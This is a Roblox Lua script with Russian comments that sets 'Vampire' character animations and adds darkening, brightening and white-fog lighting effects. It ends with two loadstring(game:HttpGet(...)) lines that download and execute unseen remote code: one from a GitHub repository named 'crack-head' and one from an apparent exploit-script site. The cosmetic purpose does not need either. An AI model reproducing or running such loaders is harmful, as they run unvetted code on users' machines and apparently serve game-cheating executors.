-- Получение услуг
local player = game.Players.LocalPlayer
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")

-- Функция для активации анимации "Vampire"
local function activateVampireAnimation(character)
    local animate = character:WaitForChild("Animate")
    
    animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
    animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
    animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
    animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
    animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
    animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
    animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
end

-- Функция для применения эффекта затемнения
local function applyDarkeningEffect()
    local colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.Name = "DarkenEffect"
    colorCorrection.Parent = Lighting

    -- Установка значений для затемнения
    colorCorrection.Brightness = -0.5  -- Уменьшение яркости
    colorCorrection.Contrast = 0.5      -- Увеличение контраста
    colorCorrection.Saturation = 0.1    -- Снижение насыщенности
    colorCorrection.TintColor = Color3.fromRGB(50, 50, 50)  -- Псевдосерый оттенок

    -- Настройка задержки для постепенного применения эффекта
    local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
    local tween = TweenService:Create(colorCorrection, tweenInfo, {Brightness = -0.7})
    tween:Play()

    -- Задержка перед следующим эффектом
    wait(3)
end

-- Функция для применения эффекта освещения
local function applyLighteningEffect()
    local colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.Name = "LightenEffect"
    colorCorrection.Parent = Lighting

    -- Установка значений для увеличения яркости на 20%
    colorCorrection.Brightness = 0.2  -- Увеличение яркости на 20%
    colorCorrection.Contrast = 0.5    -- Контраст можно оставить без изменений, если нужно
    colorCorrection.Saturation = 1    -- Насыщенность также оставим без изменений
    colorCorrection.TintColor = Color3.fromRGB(255, 255, 255)  -- Простой белый оттенок для света

    -- Применение эффекта
    colorCorrection.Enabled = true
end

-- Функция для применения белого тумана
local function applyFogEffect()
    -- Создание эффекта белого тумана
    Lighting.FogStart = 0  -- Место, откуда начинается туман
    Lighting.FogEnd = 120  -- Место, где туман заканчивается
    Lighting.FogColor = Color3.fromRGB(255, 255, 255)  -- Белый туман
end

-- Объединённая функция для всех эффектов
local function applyAllEffects()
    -- Применяем светлую яркость
    applyLighteningEffect()
    wait(1)  -- Немного ждём, чтобы эффект был виден
    
    -- Применяем затемнение
    applyDarkeningEffect()
    wait(1)  -- Немного ждём для перехода
    
    -- Применяем туман
    applyFogEffect()
end

-- Подключаемся к событию CharacterAdded
player.CharacterAdded:Connect(function(character)
    -- Сначала активируем анимации
    character:WaitForChild("Humanoid")  -- Ждём, пока Humanoid появится
    activateVampireAnimation(character)  -- Активируем анимацию
    
    -- Применяем все эффекты
    applyAllEffects()
end)

-- Если персонаж уже существует (например, при первом запуске)
if player.Character then
    -- Сначала активируем анимации
    activateVampireAnimation(player.Character)
    
    -- Применяем все эффекты
    applyAllEffects()
end

-- Загружаем первый скрипт
loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/crack-head/refs/heads/main/pk"))()

-- Загружаем второй скрипт
loadstring(game:HttpGet("https://scriptblox.com/raw/Brookhaven-RP-all-emotes-6849"))()
